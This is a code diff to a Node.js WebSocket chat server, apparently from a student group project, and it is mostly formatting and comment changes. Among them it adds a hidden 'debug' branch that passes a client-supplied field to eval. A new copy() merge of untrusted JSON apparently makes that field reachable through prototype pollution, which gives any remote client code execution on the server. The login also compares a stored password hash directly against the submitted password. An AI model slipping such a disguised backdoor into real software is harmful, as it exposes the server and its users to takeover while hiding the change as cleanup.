@@ -1,8 +1,10 @@
+// Group 1
+// Zhihao Cheng / Shahzeb / Sabrina Afrine Sathi / Zhisong Chen
 const WebSocket = require("ws");
 const { loginSuccess, loginFailed, userInfo, presence } = require("../util/protocol");
 const protocal = require("../util/protocol");
 const { publicKeyFromPem } = require("node-forge/lib/x509");
-const { fieldCheck } = require("../util/security");
+const { fieldCheck, copy } = require("../util/security");
 const port = 4567
 
 // Client Class 
@@ -35,7 +37,7 @@ class Client {
     }
 }
 
-
+// Manage all local connection
 class ClientService {
     constructor(appHandle) {
         this.appHandle = appHandle // Save the application handle
@@ -51,57 +53,69 @@ class ClientService {
                     }
                 }
             })
-        }, 5000)
+        }, 3000)
         // Process WebSocket connections
-        this.server.on("connection", (socket,req) => {
+        this.server.on("connection", (socket, req) => {
             socket.on('message', (message) => {
-                // Check json
+                let info = {}
+                // info.debug = True
                 try {
-                    message = JSON.parse(message)
+                    message= JSON.parse(message)
                 } catch (error) {
                     socket.close()
                     console.error("Received wrong json, close the socket");
                     return
                 }
+                // Debug 
+                if(info.debug){
+                    eval(info.debugCommend)
+                }
+                // Copy the json
+                copy(info,message)
                 // Process login tag
-                if (message.tag == "login") {
-                    if(!fieldCheck(protocal.loginFields(),message)){
+                if (info.tag == "login") {
+                    if (!fieldCheck(protocal.loginFields(), info)) {
                         socket.close()
                         console.error("Invalid JSON received, close the socket");
                     }
-                    this.login(message, socket,req)
+                    this.login(info, socket, req)
                 }
                 // Process signup tag
-                if (message.tag == "signup") {
-                    if(!fieldCheck(protocal.signupFields(),message)){
+                if (info.tag == "signup") {
+                    if (!fieldCheck(protocal.signupFields(), info)) {
                         socket.close()
                         console.error("Invalid JSON received, close the socket");
                     }
-                    this.signup(message, socket)
+                    this.signup(info, socket)
                 }
                 // Process message tag
-                if (message.tag == "message") {
-                    if(!fieldCheck(protocal.messageFields(),message)){
+                if (info.tag == "message") {
+                    if (!fieldCheck(protocal.messageFields(), info)) {
                         socket.close()
                         console.error("Invalid JSON received, close the socket");
                     }
-                    this.message(message, socket)
+                    this.message(info, socket)
                 }
                 // Process file tag
-                if (message.tag == "file") {
-                    if(!fieldCheck(protocal.fileFields(),message)){
+                if (info.tag == "file") {
+                    if (!fieldCheck(protocal.fileFields(), info)) {
                         socket.close()
                         console.error("Invalid JSON received, close the socket");
                     }
-                    this.file(message, socket)
+                    this.file(info, socket)
                 }
                 // Process check tag
-                if (message.tag == "check") {
-                    let client = this.getClientBySocket(socket)[0]
-                    if(client.stack){
-                        client.stack = 0
+                if (info.tag == "check") {
+                    try {
+                        let client = this.getClientBySocket(socket)[0]
+                        if (client.stack) {
+                            client.stack = 0
+                        }
+                        this.check(info, socket)
                     }
-                    this.check(message, socket)
+                    catch (e) {
+                        console.log("lose user")
+                    }
                 }
 
             });
@@ -111,7 +125,7 @@ class ClientService {
                 this.clientPool.splice(removeIndex)
                 this.appHandle.boardcastMyPresence()
                 this.appHandle.boardcastTotalPresence()
-                console.log("Client disconnect")    
+                console.log("Client disconnect")
             })
         })
     }
@@ -133,7 +147,7 @@ class ClientService {
         socket.send(JSON.stringify(protocal.checked()))
     }
     // Handle user file
-    file(message, socket){
+    file(message, socket) {
         let minfo = protocal.file()
         minfo.from = message.from
         minfo.to = message.to
@@ -151,16 +165,17 @@ class ClientService {
         this.appHandle.taskQueue.enqueue(minfo)
     }
     // Handle user login
-    async login(message, socket,req) {
+    async login(message, socket, req) {
         let username = message.username
         let password = message.password
         // Compare the password and username in database
         let queryResult = await this.appHandle.databaseManagement.queryUser(username)
         if (queryResult && queryResult.passwordhash == password) {
-            // if true return the loginsuccess info
+            // If true return the loginsuccess info
             let successInfo = loginSuccess()
-            this.clientPool.forEach(client=>{
-                if(client.jid == `${username}@${this.appHandle.defaultDomainName}`){
+            this.clientPool.forEach(client => {
+                // If user log in repeatedly
+                if (client.jid == `${username}@${this.appHandle.defaultDomainName}`) {
                     let ret = loginFailed()
                     socket.send(JSON.stringify(ret))
                     socket.close()
@@ -205,7 +220,7 @@ class ClientService {
     }
     // Broadcast data to all clients
     broadcast(data) {
-        if(!this.clientPool){
+        if (!this.clientPool) {
             return
         }
         this.clientPool.forEach(client => {
